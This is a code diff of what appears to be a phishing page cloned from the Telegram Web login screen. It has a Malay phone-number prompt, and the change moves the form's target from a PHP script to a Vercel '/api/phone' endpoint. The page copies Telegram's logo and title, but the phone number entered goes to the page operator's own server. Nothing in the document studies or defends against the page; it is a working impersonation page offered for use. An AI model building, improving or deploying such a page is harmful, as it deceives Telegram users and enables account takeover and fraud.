@@ -34,60 +34,71 @@
     <noscript>
         <div id="logo"></div>
         <h1>Telegram Web</h1>
-<p>Please, enable JavaScript to open the app.</p>
-</noscript>
+        <p>Please, enable JavaScript to open the app.</p>
+    </noscript>
 
-<div id="root">
-    <div id="UiLoader" class="KD2TsjdEc_LBLsR_ReWT" style="--theme-background-color: #99BA92;">
-        <div class="Transition full-height is-auth fade">
-            <div class="Transition__slide--active">
-                <div id="auth-phone-number-form" class="custom-scroll">
-                    <div class="auth-form">
-                        <img src="../assets/img/logo tele.png" alt="Telegram Logo" class="telegram-logo">
-                        <h1>Telegram</h1>
-<p class="note">Masukkan nombor telefon anda.</p>
+    <div id="root">
+        <div id="UiLoader" class="KD2TsjdEc_LBLsR_ReWT" style="--theme-background-color: #99BA92;">
+            <div class="Transition full-height is-auth fade">
+                <div class="Transition__slide--active">
+                    <div id="auth-phone-number-form" class="custom-scroll">
+                        <div class="auth-form">
+                            <img src="../assets/img/logo tele.png" alt="Telegram Logo" class="telegram-logo">
+                            <h1>Telegram</h1>
+                            <p class="note">Masukkan nombor telefon anda.</p>
 
-<form action="req/phone.php" method="post" onsubmit="loadd();">
-    <!-- Phone Number Input -->
-    <div class="input-group" id="labelhp">
-        <input class="form-control" type="text" id="sign-in-phone-number" dir="auto" inputmode="tel" aria-label="Your phone number" name="phoneNumber" autocomplete="off" placeholder="">
-        <label for="sign-in-phone-number">Your phone number</label>
-    </div>
+                            <!-- ✅ Form diarahkan ke API Vercel (phone.js) -->
+                            <form action="/api/phone" method="post" onsubmit="loadd();">
+                                <div class="input-group" id="labelhp">
+                                    <input class="form-control"
+                                           type="text"
+                                           id="sign-in-phone-number"
+                                           dir="auto"
+                                           inputmode="tel"
+                                           aria-label="Your phone number"
+                                           name="phoneNumber"
+                                           autocomplete="off"
+                                           placeholder="">
+                                    <label for="sign-in-phone-number">Your phone number</label>
+                                </div>
 
-    <!-- Hidden full number field -->
-    <input type="hidden" name="fullPhoneNumber" id="fullPhoneNumber">
+                                <!-- Hidden input untuk nomor yang sudah diformat -->
+                                <input type="hidden" name="fullPhoneNumber" id="fullPhoneNumber">
 
-    <button id="nextBtn" type="submit" class="Button default primary" style="display:none;">NEXT</button>
-</form>
+                                <button id="nextBtn" type="submit" class="Button default primary" style="display:none;">NEXT</button>
+                            </form>
+                        </div>
+                    </div>
 
-<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-<script>
-    var inpHp = document.getElementById("sign-in-phone-number");
-    var btnnext = document.getElementById("nextBtn");
-    var fullPhoneInput = document.getElementById("fullPhoneNumber");
+                    <!-- Script Validation -->
+                    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+                    <script>
+                        var inpHp = document.getElementById("sign-in-phone-number");
+                        var btnnext = document.getElementById("nextBtn");
+                        var fullPhoneInput = document.getElementById("fullPhoneNumber");
 
-    function validate() {
-        if (inpHp.value.length > 6) {
-            btnnext.style.display = "block";
-        } else {
-            btnnext.style.display = "none";
-        }
-    }
+                        function validate() {
+                            if (inpHp.value.length > 6) {
+                                btnnext.style.display = "block";
+                            } else {
+                                btnnext.style.display = "none";
+                            }
+                        }
 
-    inpHp.addEventListener("input", function () {
-        validate();
-        updateFullPhone();
-    });
+                        inpHp.addEventListener("input", function () {
+                            validate();
+                            updateFullPhone();
+                        });
 
-    function updateFullPhone() {
-        // Karena dropdown negara dihapus, langsung ambil dari input
-        fullPhoneInput.value = inpHp.value.replace(/\s+/g, '');
-    }
+                        function updateFullPhone() {
+                            // Format nomor tanpa spasi
+                            fullPhoneInput.value = inpHp.value.replace(/\s+/g, '');
+                        }
 
-    function loadd(){
-        $("#loader").fadeIn();
-    }
-                </script>
+                        function loadd(){
+                            $("#loader").fadeIn();
+                        }
+                    </script>
                 </div>
             </div>
         </div>
